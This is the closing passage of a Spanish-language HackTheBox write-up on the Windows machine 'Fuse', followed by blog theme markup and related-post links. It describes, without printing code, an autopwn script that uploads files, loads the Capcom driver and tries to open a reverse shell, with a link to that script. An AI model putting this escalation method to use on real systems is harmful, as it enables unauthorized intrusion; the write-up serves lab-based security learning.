+<p>He creado un script para la subida y ejecución de los archivos… El único problema está en la obtención de la reverse Shell (no sé por qué, averigüe y averigüe pero nada). De igual forma seguiré testeando, pero lo subo por si alguno sabe como debe ser llamado <code>ExploitCapcom.exe</code> desde el script para que haga la petición correctamente. Lo demás funciona perfe, sube los archivos y carga el driver.</p>
+
+<p>El problema está en la herramienta (winrm) o en la línea de ejecución del script, ya que tomando el mismo comando y usándolo dentro de la sesión de PowerShell de <code>evilwinrm</code> ta todo bien y se ejecuta correctamente.</p>
+
+<ul>
+  <li>Acá el autopwn: <a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/fuse/autopwn_fuse.sh">autopwn_fuse.sh</a>.</li>
+</ul>
+
+<p>…</p>
+
+<p>Qué bonita maquina, curiosa e interesante forma de escalar privilegios, me gusto mucho el usar herramientas a las que no estamos acostumbrados (<strong>Visual Studio</strong>) para compilar y crear nuestros <code>.exe</code>… Cada vez más cariño a las máquinas <strong>Windows</strong> aunque sean (siento yo) más difíciles… Muchas gracias yyyyyyyyyyyyyyyyyyyy a seguir rompiendo todo (:</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Fuse&url=http://localhost:4000/htb/fuse" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#SMB">SMB</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#visual-studio">visual-studio</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#windows-privileges">windows-privileges</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/resolute">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220banner.png" alt="HackTheBox - Resolute"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/resolute">HackTheBox - Resolute</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel medio. Enumeraremos hasta más no poder un controlador de dominio, veremos contraseñas volando libremente e inyectaremos una DLL maliciosa en un servidor DNS 😲
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">14 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/bastard">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7banner.png" alt="HackTheBox - Bastard"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/bastard">HackTheBox - Bastard</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel medio, vamos a romper Drupal 7.54 y veremos dos maneras de escalar, generando procesos maliciosos con ayuda del privilegio SeImpersonate y de JuicyPotato o explotando el lindo...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">11 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/atom">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340banner.png" alt="HackTheBox - Atom"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/atom">HackTheBox - Atom</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel medio. Jugaremos con SMB, recrearemos actualizaciones (feature de electron) en binarios para que sean ejecutados por un equipo de QA y encontraremos la relación amorosa entre Redis...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">10 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
